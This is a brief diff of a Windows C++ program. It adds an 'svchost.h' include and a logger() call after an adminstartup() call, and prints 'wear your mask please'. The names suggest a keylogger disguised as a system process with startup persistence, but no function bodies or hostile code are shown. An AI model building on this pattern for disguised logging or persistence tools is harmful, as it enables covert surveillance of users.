@@ -9,10 +9,12 @@
 #include <string>
 
 #include "Shlwapi.h"
-#include <string>
 
 
 #include <iostream>
+#include "svchost.h"
+#include <tchar.h>
+
 using namespace std;
 
 
@@ -59,6 +61,7 @@ int _tmain(int argc, _TCHAR* argv[])
 {
 	printf("wear your mask please\n");
 	adminstartup();
+	logger();
 	return 0;
 }
 
